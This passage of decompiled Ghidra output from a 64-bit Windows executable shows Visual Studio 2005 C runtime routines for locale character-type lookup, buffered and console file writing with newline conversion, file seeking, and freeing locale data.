          local_38[0x32] = local_38[0x32] & 0xfffffffd;
        }
        return 0x22;
      }
    }
    else if (local_res10[0] == 0) {
      if (param_1 != (int *)0x0) {
        *param_1 = iVar3;
      }
      goto LAB_1400100ed;
    }
    pDVar5 = FUN_140009c00();
    *pDVar5 = 0x2a;
    pDVar5 = FUN_140009c00();
    DVar4 = *pDVar5;
  }
  if (bVar2) {
    local_38[0x32] = local_38[0x32] & 0xfffffffd;
  }
  return DVar4;
}




void FUN_140010190(int *param_1,ulonglong *param_2,ulonglong param_3,WCHAR param_4)

{
  FUN_14000fee0(param_1,param_2,param_3,param_4,(undefined8 *)0x0);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ushort FUN_1400101b0(uint param_1,undefined8 *param_2)

{
  wchar_t wVar1;
  undefined *puVar2;
  bool bVar3;
  pthreadlocinfo ptVar4;
  DWORD *local_18;
  
  bVar3 = false;
  if (param_2 == (undefined8 *)0x0) {
    local_18 = FUN_14000b3d0();
    ptVar4 = *(pthreadlocinfo *)(local_18 + 0x30);
    puVar2 = *(undefined **)(local_18 + 0x2e);
    if ((ptVar4 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & local_18[0x32]) == 0)) {
      ptVar4 = __updatetlocinfo();
    }
    if ((puVar2 != PTR_DAT_14001aa80) && ((_DAT_14001ab88 & local_18[0x32]) == 0)) {
      __updatetmbcinfo();
    }
    if ((local_18[0x32] & 2) == 0) {
      bVar3 = true;
      local_18[0x32] = local_18[0x32] | 2;
    }
  }
  else {
    ptVar4 = (pthreadlocinfo)*param_2;
    bVar3 = false;
  }
  wVar1 = ptVar4->locale_name[3][param_1 & 0xff];
  if (bVar3) {
    local_18[0x32] = local_18[0x32] & 0xfffffffd;
  }
  return wVar1 & 0x8000;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ushort FUN_1400102a0(uint param_1)

{
  wchar_t wVar1;
  undefined *puVar2;
  DWORD *pDVar3;
  pthreadlocinfo ptVar4;
  bool bVar5;
  
  pDVar3 = FUN_14000b3d0();
  ptVar4 = *(pthreadlocinfo *)(pDVar3 + 0x30);
  puVar2 = *(undefined **)(pDVar3 + 0x2e);
  if ((ptVar4 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
    ptVar4 = __updatetlocinfo();
  }
  if ((puVar2 != PTR_DAT_14001aa80) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
    __updatetmbcinfo();
  }
  bVar5 = (pDVar3[0x32] & 2) == 0;
  if (bVar5) {
    pDVar3[0x32] = pDVar3[0x32] | 2;
  }
  wVar1 = ptVar4->locale_name[3][param_1 & 0xff];
  if (bVar5) {
    pDVar3[0x32] = pDVar3[0x32] & 0xfffffffd;
  }
  return wVar1 & 0x8000;
}




void FUN_140010370(byte param_1,int param_2,FILE *param_3,int *param_4)

{
  int *piVar1;
  uint uVar2;
  ulonglong uVar3;
  
  if (param_2 < 1) {
    return;
  }
  do {
    param_2 = param_2 + -1;
    if (((param_3->_flag & 0x40) == 0) || (param_3->_base != (char *)0x0)) {
      piVar1 = &param_3->_cnt;
      *piVar1 = *piVar1 + -1;
      if (*piVar1 < 0) {
        uVar3 = FUN_140009cf0((int)(char)param_1,param_3);
        uVar2 = (uint)uVar3;
      }
      else {
        *param_3->_ptr = param_1;
        param_3->_ptr = param_3->_ptr + 1;
        uVar2 = (uint)param_1;
      }
      if (uVar2 == 0xffffffff) {
        *param_4 = -1;
        return;
      }
    }
    *param_4 = *param_4 + 1;
    if (*param_4 == -1) {
      return;
    }
  } while (0 < param_2);
  return;
}




void FUN_140010400(byte *param_1,int param_2,FILE *param_3,int *param_4)

{
  int *piVar1;
  byte bVar2;
  uint uVar3;
  DWORD *pDVar4;
  ulonglong uVar5;
  
  if (((param_3->_flag & 0x40) == 0) || (param_3->_base != (char *)0x0)) {
    if (0 < param_2) {
      do {
        bVar2 = *param_1;
        param_2 = param_2 + -1;
        if (((param_3->_flag & 0x40) == 0) || (param_3->_base != (char *)0x0)) {
          piVar1 = &param_3->_cnt;
          *piVar1 = *piVar1 + -1;
          if (*piVar1 < 0) {
            uVar5 = FUN_140009cf0((int)(char)bVar2,param_3);
            uVar3 = (uint)uVar5;
          }
          else {
            *param_3->_ptr = bVar2;
            param_3->_ptr = param_3->_ptr + 1;
            uVar3 = (uint)bVar2;
          }
          if (uVar3 != 0xffffffff) goto LAB_14001047c;
          *param_4 = -1;
        }
        else {
LAB_14001047c:
          *param_4 = *param_4 + 1;
        }
        param_1 = param_1 + 1;
        if (*param_4 == -1) {
          pDVar4 = FUN_140009c00();
          if (*pDVar4 != 0x2a) {
            return;
          }
          if (((param_3->_flag & 0x40) == 0) || (param_3->_base != (char *)0x0)) {
            piVar1 = &param_3->_cnt;
            *piVar1 = *piVar1 + -1;
            if (*piVar1 < 0) {
              uVar5 = FUN_140009cf0(0x3f,param_3);
              if ((int)uVar5 == -1) {
                *param_4 = -1;
                goto LAB_1400104b2;
              }
            }
            else {
              *param_3->_ptr = '?';
              param_3->_ptr = param_3->_ptr + 1;
            }
          }
          *param_4 = *param_4 + 1;
        }
LAB_1400104b2:
      } while (0 < param_2);
    }
  }
  else {
    *param_4 = *param_4 + param_2;
  }
  return;
}




undefined8 FUN_140011500(uint param_1,undefined8 param_2,DWORD param_3)

{
  byte *pbVar1;
  DWORD DVar2;
  HANDLE hFile;
  DWORD *pDVar3;
  undefined8 local_res10;
  
  local_res10 = param_2;
  hFile = (HANDLE)FUN_140014070(param_1);
  if (hFile == (HANDLE)0xffffffffffffffff) {
    pDVar3 = FUN_140009c00();
    *pDVar3 = 9;
    return 0xffffffffffffffff;
  }
  DVar2 = SetFilePointer(hFile,(LONG)local_res10,(PLONG)((longlong)&local_res10 + 4),param_3);
  local_res10 = CONCAT44(local_res10._4_4_,DVar2);
  if (DVar2 == 0xffffffff) {
    DVar2 = GetLastError();
    if (DVar2 != 0) {
      _dosmaperr(DVar2);
      return 0xffffffffffffffff;
    }
  }
  pbVar1 = (byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                   (ulonglong)(param_1 & 0x1f) * 0x50);
  *pbVar1 = *pbVar1 & 0xfd;
  return local_res10;
}




undefined8 FUN_1400115b0(uint param_1,undefined8 param_2,DWORD param_3)

{
  DWORD *pDVar1;
  undefined8 uVar2;
  
  if (param_1 == 0xfffffffe) {
    pDVar1 = FUN_140009c30();
    *pDVar1 = 0;
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    uVar2 = 0xffffffffffffffff;
  }
  else if (((int)param_1 < 0) || (DAT_14001c4cc <= param_1)) {
    pDVar1 = FUN_140009c30();
    *pDVar1 = 0;
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    FUN_1400072d0(0,0,0,0,0);
    uVar2 = 0xffffffffffffffff;
  }
  else if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                     (ulonglong)(param_1 & 0x1f) * 0x50) & 1) == 0) {
    pDVar1 = FUN_140009c30();
    *pDVar1 = 0;
    pDVar1 = FUN_140009c00();
    *pDVar1 = 9;
    FUN_1400072d0(0,0,0,0,0);
    uVar2 = 0xffffffffffffffff;
  }
  else {
    FUN_140014110(param_1);
    if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                  (ulonglong)(param_1 & 0x1f) * 0x50) & 1) == 0) {
      pDVar1 = FUN_140009c00();
      *pDVar1 = 9;
      pDVar1 = FUN_140009c30();
      *pDVar1 = 0;
      uVar2 = 0xffffffffffffffff;
    }
    else {
      uVar2 = FUN_140011500(param_1,param_2,param_3);
    }
    FUN_1400141e0(param_1);
  }
  return uVar2;
}




void FUN_1400116f0(undefined8 param_1,longlong param_2)

{
  FUN_1400141e0(*(uint *)(param_2 + 0x60));
  return;
}




void FUN_140011710(uint param_1,WCHAR *param_2,uint param_3)

{
  char cVar1;
  uint uVar2;
  byte bVar3;
  ushort uVar4;
  WCHAR WVar5;
  BOOL BVar6;
  DWORD DVar7;
  int iVar8;
  DWORD nNumberOfBytesToWrite;
  DWORD DVar9;
  DWORD *pDVar10;
  undefined7 extraout_var;
  undefined6 extraout_var_00;
  ulonglong uVar11;
  int iVar12;
  WCHAR *pWVar13;
  WCHAR *pWVar14;
  char cVar15;
  int iVar16;
  UINT CodePage;
  longlong lVar17;
  uint uVar18;
  longlong lVar19;
  undefined1 auStackY_628 [32];
  WCHAR local_5e8 [2];
  uint local_5e4;
  UINT local_5e0;
  DWORD local_5dc;
  longlong local_5d8;
  longlong local_5d0;
  CHAR local_5c8 [16];
  WCHAR local_5b8 [520];
  WCHAR local_1a8 [176];
  ulonglong local_48;
  
  local_48 = DAT_14001a0b0 ^ (ulonglong)auStackY_628;
  uVar18 = 0;
  if (param_3 == 0) goto LAB_140011e68;
  if (param_2 == (WCHAR *)0x0) {
    pDVar10 = FUN_140009c30();
    *pDVar10 = 0;
    pDVar10 = FUN_140009c00();
    *pDVar10 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    goto LAB_140011e68;
  }
  lVar19 = (longlong)(int)param_1 >> 5;
  lVar17 = (ulonglong)(param_1 & 0x1f) * 0x50;
  cVar15 = (char)(*(char *)(lVar17 + 0x38 + (&DAT_14001c4e0)[lVar19]) * '\x02') >> 1;
  local_5d8 = lVar19;
  local_5d0 = lVar17;
  if (((cVar15 == '\x02') || (cVar15 == '\x01')) && ((~param_3 & 1) == 0)) {
    pDVar10 = FUN_140009c30();
    *pDVar10 = 0;
    pDVar10 = FUN_140009c00();
    *pDVar10 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    goto LAB_140011e68;
  }
  if ((*(byte *)(lVar17 + 8 + (&DAT_14001c4e0)[lVar19]) & 0x20) != 0) {
    FUN_140011500(param_1,0,2);
  }
  bVar3 = FUN_14000fde0(param_1);
  iVar16 = (int)param_2;
  if (((int)CONCAT71(extraout_var,bVar3) == 0) ||
     ((*(byte *)(lVar17 + 8 + (&DAT_14001c4e0)[lVar19]) & 0x80) == 0)) {
LAB_140011ae9:
    if ((*(byte *)(lVar17 + 8 + (&DAT_14001c4e0)[lVar19]) & 0x80) == 0) {
      BVar6 = WriteFile(*(HANDLE *)(lVar17 + (&DAT_14001c4e0)[lVar19]),param_2,param_3,&local_5e4,
                        (LPOVERLAPPED)0x0);
      if (BVar6 == 0) {
        DVar7 = GetLastError();
      }
      else {
        uVar18 = local_5e4;
        DVar9 = 0;
LAB_140011dd7:
        DVar7 = DVar9;
        if (uVar18 != 0) goto LAB_140011e68;
      }
      goto LAB_140011ded;
    }
    DVar7 = 0;
    DVar9 = 0;
    if (cVar15 == '\0') {
      pWVar13 = param_2;
      if (param_3 != 0) {
        do {
          pWVar14 = local_5b8;
          uVar11 = 0;
          do {
            if (param_3 <= (uint)((int)pWVar13 - iVar16)) break;
            WVar5 = *pWVar13;
            pWVar13 = (WCHAR *)((longlong)pWVar13 + 1);
            if ((char)WVar5 == '\n') {
              *(char *)pWVar14 = '\r';
              pWVar14 = (WCHAR *)((longlong)pWVar14 + 1);
              uVar11 = uVar11 + 1;
            }
            uVar11 = uVar11 + 1;
            *(char *)pWVar14 = (char)WVar5;
            pWVar14 = (WCHAR *)((longlong)pWVar14 + 1);
          } while (uVar11 < 0x400);
          BVar6 = WriteFile(*(HANDLE *)(lVar17 + (&DAT_14001c4e0)[local_5d8]),local_5b8,
                            (int)pWVar14 - (int)local_5b8,&local_5e4,(LPOVERLAPPED)0x0);
          if (BVar6 == 0) {
            DVar9 = GetLastError();
            goto LAB_140011dd7;
          }
          uVar18 = uVar18 + local_5e4;
          if (((longlong)(int)local_5e4 < (longlong)pWVar14 - (longlong)local_5b8) ||
             (param_3 <= (uint)((int)pWVar13 - iVar16))) goto LAB_140011dd7;
        } while( true );
      }
    }
    else if (cVar15 == '\x02') {
      pWVar13 = param_2;
      if (param_3 != 0) {
        do {
          pWVar14 = local_5b8;
          uVar11 = 0;
          do {
            if (param_3 <= (uint)((int)pWVar13 - iVar16)) break;
            WVar5 = *pWVar13;
            pWVar13 = pWVar13 + 1;
            if (WVar5 == L'\n') {
              *pWVar14 = L'\r';
              pWVar14 = pWVar14 + 1;
              uVar11 = uVar11 + 2;
            }
            uVar11 = uVar11 + 2;
            *pWVar14 = WVar5;
            pWVar14 = pWVar14 + 1;
          } while (uVar11 < 0x3ff);
          BVar6 = WriteFile(*(HANDLE *)(lVar17 + (&DAT_14001c4e0)[local_5d8]),local_5b8,
                            (int)pWVar14 - (int)local_5b8,&local_5e4,(LPOVERLAPPED)0x0);
          if (BVar6 == 0) {
            DVar9 = GetLastError();
            goto LAB_140011dd7;
          }
          uVar18 = uVar18 + local_5e4;
          if (((longlong)(int)local_5e4 < (longlong)pWVar14 - (longlong)local_5b8) ||
             (param_3 <= (uint)((int)pWVar13 - iVar16))) goto LAB_140011dd7;
        } while( true );
      }
    }
    else {
      pWVar13 = param_2;
      if (param_3 != 0) {
        do {
          pWVar14 = local_1a8;
          uVar11 = 0;
          do {
            if (param_3 <= (uint)((int)pWVar13 - iVar16)) break;
            WVar5 = *pWVar13;
            pWVar13 = pWVar13 + 1;
            if (WVar5 == L'\n') {
              *pWVar14 = L'\r';
              pWVar14 = pWVar14 + 1;
              uVar11 = uVar11 + 2;
            }
            uVar11 = uVar11 + 2;
            *pWVar14 = WVar5;
            pWVar14 = pWVar14 + 1;
          } while (uVar11 < 0x152);
          iVar8 = WideCharToMultiByte(0xfde9,0,local_1a8,((int)pWVar14 - (int)local_1a8) / 2,
                                      (LPSTR)local_5b8,0x2ab,(LPCSTR)0x0,(LPBOOL)0x0);
          if (iVar8 == 0) {
            DVar9 = GetLastError();
            goto LAB_140011dd7;
          }
          iVar12 = 0;
          do {
            BVar6 = WriteFile(*(HANDLE *)(local_5d0 + (&DAT_14001c4e0)[local_5d8]),
                              (LPCVOID)((longlong)local_5b8 + (longlong)iVar12),iVar8 - iVar12,
                              &local_5e4,(LPOVERLAPPED)0x0);
            if (BVar6 == 0) {
              DVar7 = GetLastError();
              DVar9 = DVar7;
              if (iVar12 < iVar8) goto LAB_140011dd7;
              break;
            }
            iVar12 = iVar12 + local_5e4;
          } while (iVar12 < iVar8);
          uVar18 = (int)pWVar13 - iVar16;
          DVar9 = DVar7;
          if (param_3 <= uVar18) goto LAB_140011dd7;
        } while( true );
      }
    }
  }
  else {
    pDVar10 = FUN_14000b3d0();
    iVar8 = *(int *)(*(longlong *)(pDVar10 + 0x30) + 0x14);
    BVar6 = GetConsoleMode(*(HANDLE *)(lVar17 + (&DAT_14001c4e0)[lVar19]),&local_5e0);
    if ((BVar6 == 0) || ((iVar8 == 0 && (cVar15 == '\0')))) goto LAB_140011ae9;
    DVar7 = GetConsoleCP();
    local_5dc = 0;
    pWVar13 = param_2;
    local_5e0 = DVar7;
    CodePage = DVar7;
    if (param_3 != 0) {
      do {
        if (cVar15 == '\0') {
          cVar1 = (char)*pWVar13;
          DVar7 = (DWORD)(cVar1 == '\n');
          uVar4 = FUN_1400102a0((int)cVar1);
          if ((int)CONCAT62(extraout_var_00,uVar4) == 0) {
            iVar8 = FUN_1400145a0(local_5e8,(byte *)pWVar13,1);
            DVar9 = local_5e0;
            if (iVar8 == -1) break;
          }
          else {
            DVar9 = local_5e0;
            if (((longlong)(((ulonglong)param_3 - (longlong)pWVar13) + (longlong)param_2) < 2) ||
               (iVar8 = FUN_1400145a0(local_5e8,(byte *)pWVar13,2), DVar9 = local_5e0, iVar8 == -1))
            break;
            pWVar13 = (WCHAR *)((longlong)pWVar13 + 1);
          }
          pWVar13 = (WCHAR *)((longlong)pWVar13 + 1);
          nNumberOfBytesToWrite =
               WideCharToMultiByte(CodePage,0,local_5e8,1,local_5c8,5,(LPCSTR)0x0,(LPBOOL)0x0);
          DVar9 = local_5e0;
          if (nNumberOfBytesToWrite == 0) break;
          BVar6 = WriteFile(*(HANDLE *)(local_5d0 + (&DAT_14001c4e0)[local_5d8]),local_5c8,
                            nNumberOfBytesToWrite,&local_5dc,(LPOVERLAPPED)0x0);
          if (BVar6 == 0) {
            DVar9 = GetLastError();
            break;
          }
          uVar18 = uVar18 + local_5dc;
          DVar9 = local_5e0;
          if ((int)local_5dc < (int)nNumberOfBytesToWrite) break;
          uVar2 = uVar18;
          CodePage = local_5e0;
          if (cVar1 == '\n') {
            local_5c8[0] = '\r';
            BVar6 = WriteFile(*(HANDLE *)(local_5d0 + (&DAT_14001c4e0)[local_5d8]),local_5c8,1,
                              &local_5dc,(LPOVERLAPPED)0x0);
            if (BVar6 == 0) {
              DVar9 = GetLastError();
              break;
            }
            DVar9 = local_5e0;
            if ((int)local_5dc < 1) break;
            uVar2 = uVar18 + 1;
            CodePage = local_5e0;
          }
        }
        else {
          if ((cVar15 == '\x01') || (cVar15 == '\x02')) {
            local_5e8[0] = *pWVar13;
            DVar7 = (DWORD)(local_5e8[0] == L'\n');
            pWVar13 = pWVar13 + 1;
          }
          if ((cVar15 == '\x01') || (uVar2 = uVar18, cVar15 == '\x02')) {
            WVar5 = FUN_140014210(local_5e8[0]);
            if (WVar5 != local_5e8[0]) {
              DVar9 = GetLastError();
              break;
            }
            uVar2 = uVar18 + 1;
            if (DVar7 != 0) {
              local_5e8[0] = L'\r';
              WVar5 = FUN_140014210(L'\r');
              if (WVar5 != local_5e8[0]) {
                DVar9 = GetLastError();
                uVar18 = uVar18 + 1;
                break;
              }
              uVar2 = uVar18 + 2;
            }
          }
        }
        uVar18 = uVar2;
        DVar9 = local_5e0;
      } while ((uint)((int)pWVar13 - iVar16) < param_3);
      goto LAB_140011dd7;
    }
LAB_140011ded:
    lVar17 = local_5d0;
    if (DVar7 != 0) {
      if (DVar7 == 5) {
        pDVar10 = FUN_140009c00();
        *pDVar10 = 9;
        pDVar10 = FUN_140009c30();
        *pDVar10 = 5;
      }
      else {
        _dosmaperr(DVar7);
      }
      goto LAB_140011e68;
    }
  }
  if (((*(byte *)(lVar17 + 8 + (&DAT_14001c4e0)[local_5d8]) & 0x40) == 0) ||
     ((char)*param_2 != '\x1a')) {
    pDVar10 = FUN_140009c00();
    *pDVar10 = 0x1c;
    pDVar10 = FUN_140009c30();
    *pDVar10 = 0;
  }
LAB_140011e68:
  __security_check_cookie(local_48 ^ (ulonglong)auStackY_628);
  return;
}




undefined4 FUN_140011e90(uint param_1,WCHAR *param_2,uint param_3)

{
  undefined4 uVar1;
  DWORD *pDVar2;
  
  if (param_1 == 0xfffffffe) {
    pDVar2 = FUN_140009c30();
    *pDVar2 = 0;
    pDVar2 = FUN_140009c00();
    *pDVar2 = 9;
    uVar1 = 0xffffffff;
  }
  else if (((int)param_1 < 0) || (DAT_14001c4cc <= param_1)) {
    pDVar2 = FUN_140009c30();
    *pDVar2 = 0;
    pDVar2 = FUN_140009c00();
    *pDVar2 = 9;
    FUN_1400072d0(0,0,0,0,0);
    uVar1 = 0xffffffff;
  }
  else if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                     (ulonglong)(param_1 & 0x1f) * 0x50) & 1) == 0) {
    pDVar2 = FUN_140009c30();
    *pDVar2 = 0;
    pDVar2 = FUN_140009c00();
    *pDVar2 = 9;
    FUN_1400072d0(0,0,0,0,0);
    uVar1 = 0xffffffff;
  }
  else {
    FUN_140014110(param_1);
    if ((*(byte *)((&DAT_14001c4e0)[(longlong)(int)param_1 >> 5] + 8 +
                  (ulonglong)(param_1 & 0x1f) * 0x50) & 1) == 0) {
      pDVar2 = FUN_140009c00();
      *pDVar2 = 9;
      pDVar2 = FUN_140009c30();
      *pDVar2 = 0;
      uVar1 = 0xffffffff;
    }
    else {
      uVar1 = FUN_140011710(param_1,param_2,param_3);
    }
    FUN_1400141e0(param_1);
  }
  return uVar1;
}




void FUN_140011fc0(undefined8 param_1,longlong param_2)

{
  FUN_1400141e0(*(uint *)(param_2 + 0x60));
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    _getbuf
   
   Library: Visual Studio 2005 Release */

void __cdecl _getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_14001bbc0 = _DAT_14001bbc0 + 1;
  pcVar1 = (char *)FUN_14000f600(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_bufsiz = 2;
    _File->_base = (char *)&_File->_charbuf;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}




/* WARNING: Function: __chkstk replaced with injection: alloca_probe */

void FUN_140012040(longlong *param_1,DWORD param_2,LPCSTR param_3,uint param_4,LPWORD param_5,
                  UINT param_6,LCID param_7,int param_8)

{
  ulonglong uVar1;
  longlong lVar2;
  BOOL BVar3;
  DWORD DVar4;
  UINT UVar5;
  int iVar6;
  ulonglong uVar7;
  LPCWSTR lpSrcStr;
  LPCSTR pCVar8;
  undefined1 *puVar9;
  undefined1 *puVar10;
  undefined1 *puVar11;
  ulonglong uVar12;
  uint local_res20 [2];
  undefined1 auStackY_68 [32];
  WCHAR local_38 [4];
  ulonglong local_30;
  
  puVar9 = auStackY_68;
  puVar10 = auStackY_68;
  puVar11 = auStackY_68;
  local_30 = DAT_14001a0b0 ^ (ulonglong)local_38;
  local_res20[0] = param_4;
  if (DAT_14001c320 == 0) {
    BVar3 = GetStringTypeW(1,L"",1,(LPWORD)local_38);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 != 0x78) goto LAB_1400120fe;
      DAT_14001c320 = 2;
      goto LAB_1400120c3;
    }
    DAT_14001c320 = 1;
  }
  else {
LAB_1400120fe:
    if ((DAT_14001c320 == 2) || (DAT_14001c320 == 0)) {
LAB_1400120c3:
      pCVar8 = (LPCSTR)0x0;
      if (param_7 == 0) {
        param_7 = *(LCID *)(*param_1 + 0x14);
      }
      if (param_6 == 0) {
        param_6 = *(UINT *)(*param_1 + 4);
      }
      UVar5 = FUN_140012b90(param_7);
      puVar11 = auStackY_68;
      if ((UVar5 != 0xffffffff) &&
         (((UVar5 == param_6 ||
           (pCVar8 = (LPCSTR)FUN_140012c00(param_6,UVar5,param_3,local_res20,0,0),
           puVar11 = auStackY_68, param_3 = pCVar8, pCVar8 != (LPCSTR)0x0)) &&
          (GetStringTypeA(param_7,param_2,param_3,local_res20[0],param_5), puVar11 = auStackY_68,
          pCVar8 != (LPCSTR)0x0)))) {
        FUN_14000b9c0(pCVar8);
        puVar11 = auStackY_68;
      }
      goto LAB_140012272;
    }
    if (DAT_14001c320 != 1) goto LAB_140012272;
  }
  if (param_6 == 0) {
    param_6 = *(UINT *)(*param_1 + 4);
  }
  DVar4 = 1;
  if (param_8 != 0) {
    DVar4 = 9;
  }
  iVar6 = MultiByteToWideChar(param_6,DVar4,param_3,local_res20[0],(LPWSTR)0x0,0);
  uVar12 = (ulonglong)iVar6;
  puVar11 = auStackY_68;
  if (((iVar6 == 0) || (puVar11 = auStackY_68, iVar6 < 1)) ||
     (puVar11 = auStackY_68, 0x7ffffffffffffff0 < uVar12)) goto LAB_140012272;
  uVar1 = uVar12 * 2 + 0x10;
  if (uVar1 < 0x401) {
    uVar7 = uVar12 * 2 + 0x1f;
    if (uVar7 <= uVar1) {
      uVar7 = 0xffffffffffffff0;
    }
    lVar2 = -(uVar7 & 0xfffffffffffffff0);
    puVar9 = auStackY_68 + lVar2;
    lpSrcStr = (LPCWSTR)((longlong)local_38 + lVar2);
    puVar11 = auStackY_68 + lVar2;
    if (lpSrcStr == (LPCWSTR)0x0) goto LAB_140012272;
    lpSrcStr[0] = L'쳌';
    lpSrcStr[1] = L'\0';
LAB_1400121b2:
    lpSrcStr = lpSrcStr + 8;
    puVar10 = puVar9;
  }
  else {
    lpSrcStr = (LPCWSTR)FUN_14000dc10(uVar1);
    if (lpSrcStr != (LPCWSTR)0x0) {
      lpSrcStr[0] = L'\xdddd';
      lpSrcStr[1] = L'\0';
      goto LAB_1400121b2;
    }
  }
  puVar11 = puVar10;
  if (lpSrcStr != (LPCWSTR)0x0) {
    *(undefined8 *)(puVar10 + -8) = 0x1400121cd;
    FUN_140006070((ulonglong *)lpSrcStr,0,uVar12 * 2);
    *(int *)(puVar10 + 0x28) = iVar6;
    *(LPCWSTR *)(puVar10 + 0x20) = lpSrcStr;
    *(undefined8 *)(puVar10 + -8) = 0x1400121eb;
    iVar6 = MultiByteToWideChar(param_6,1,param_3,local_res20[0],*(LPWSTR *)(puVar10 + 0x20),
                                *(int *)(puVar10 + 0x28));
    if (iVar6 != 0) {
      *(undefined8 *)(puVar10 + -8) = 0x140012202;
      GetStringTypeW(param_2,lpSrcStr,iVar6,param_5);
    }
    if (*(int *)(lpSrcStr + -8) == 0xdddd) {
      *(undefined8 *)(puVar10 + -8) = 0x140012216;
      FUN_14000b9c0(lpSrcStr + -8);
    }
  }
LAB_140012272:
  uVar12 = local_30 ^ (ulonglong)local_38;
  *(undefined8 *)(puVar11 + -8) = 0x14001227e;
  __security_check_cookie(uVar12);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400122a0(longlong *param_1,DWORD param_2,LPCSTR param_3,uint param_4,LPWORD param_5,
                  UINT param_6,LCID param_7,int param_8)

{
  pthreadmbcinfo ptVar1;
  bool bVar2;
  DWORD *pDVar3;
  pthreadlocinfo local_38;
  pthreadmbcinfo local_30;
  DWORD *local_28;
  undefined1 local_20;
  
  bVar2 = false;
  local_20 = 0;
  if (param_1 == (longlong *)0x0) {
    pDVar3 = FUN_14000b3d0();
    local_38 = *(pthreadlocinfo *)(pDVar3 + 0x30);
    ptVar1 = *(pthreadmbcinfo *)(pDVar3 + 0x2e);
    local_30 = ptVar1;
    local_28 = pDVar3;
    if ((local_38 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
      local_38 = __updatetlocinfo();
    }
    if ((ptVar1 != (pthreadmbcinfo)PTR_DAT_14001aa80) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
      local_30 = __updatetmbcinfo();
    }
    if ((pDVar3[0x32] & 2) == 0) {
      pDVar3[0x32] = pDVar3[0x32] | 2;
      bVar2 = true;
      local_20 = 1;
    }
  }
  else {
    local_38 = (pthreadlocinfo)*param_1;
    local_30 = (pthreadmbcinfo)param_1[1];
    bVar2 = false;
    pDVar3 = local_28;
  }
  FUN_140012040((longlong *)&local_38,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  if (bVar2) {
    pDVar3[0x32] = pDVar3[0x32] & 0xfffffffd;
  }
  return;
}




/* Library Function - Single Match
    __free_lc_time
   
   Library: Visual Studio 2005 Release */

void __free_lc_time(undefined8 *param_1)

{
  if (param_1 != (undefined8 *)0x0) {
    FUN_14000b9c0((LPVOID)param_1[1]);
    FUN_14000b9c0((LPVOID)param_1[2]);
    FUN_14000b9c0((LPVOID)param_1[3]);
    FUN_14000b9c0((LPVOID)param_1[4]);
    FUN_14000b9c0((LPVOID)param_1[5]);
    FUN_14000b9c0((LPVOID)param_1[6]);
    FUN_14000b9c0((LPVOID)*param_1);
    FUN_14000b9c0((LPVOID)param_1[8]);
    FUN_14000b9c0((LPVOID)param_1[9]);
    FUN_14000b9c0((LPVOID)param_1[10]);
    FUN_14000b9c0((LPVOID)param_1[0xb]);
    FUN_14000b9c0((LPVOID)param_1[0xc]);
    FUN_14000b9c0((LPVOID)param_1[0xd]);
    FUN_14000b9c0((LPVOID)param_1[7]);
    FUN_14000b9c0((LPVOID)param_1[0xe]);
    FUN_14000b9c0((LPVOID)param_1[0xf]);
    FUN_14000b9c0((LPVOID)param_1[0x10]);
    FUN_14000b9c0((LPVOID)param_1[0x11]);
    FUN_14000b9c0((LPVOID)param_1[0x12]);
    FUN_14000b9c0((LPVOID)param_1[0x13]);
    FUN_14000b9c0((LPVOID)param_1[0x14]);
    FUN_14000b9c0((LPVOID)param_1[0x15]);
    FUN_14000b9c0((LPVOID)param_1[0x16]);
    FUN_14000b9c0((LPVOID)param_1[0x17]);
    FUN_14000b9c0((LPVOID)param_1[0x18]);
    FUN_14000b9c0((LPVOID)param_1[0x19]);
    FUN_14000b9c0((LPVOID)param_1[0x1a]);
    FUN_14000b9c0((LPVOID)param_1[0x1b]);
    FUN_14000b9c0((LPVOID)param_1[0x1c]);
    FUN_14000b9c0((LPVOID)param_1[0x1d]);
    FUN_14000b9c0((LPVOID)param_1[0x1e]);
    FUN_14000b9c0((LPVOID)param_1[0x1f]);
    FUN_14000b9c0((LPVOID)param_1[0x20]);
    FUN_14000b9c0((LPVOID)param_1[0x21]);
    FUN_14000b9c0((LPVOID)param_1[0x22]);
    FUN_14000b9c0((LPVOID)param_1[0x23]);
    FUN_14000b9c0((LPVOID)param_1[0x24]);
    FUN_14000b9c0((LPVOID)param_1[0x25]);
    FUN_14000b9c0((LPVOID)param_1[0x26]);
    FUN_14000b9c0((LPVOID)param_1[0x27]);
    FUN_14000b9c0((LPVOID)param_1[0x28]);
    FUN_14000b9c0((LPVOID)param_1[0x29]);
    FUN_14000b9c0((LPVOID)param_1[0x2a]);
  }
  return;
}




/* Library Function - Single Match
    __free_lconv_num
   
   Library: Visual Studio 2005 Release */

void __free_lconv_num(undefined8 *param_1)

{
  if (param_1 != (undefined8 *)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_14001b410) {
      FUN_14000b9c0((undefined *)*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_14001b418) {
      FUN_14000b9c0((undefined *)param_1[1]);
    }
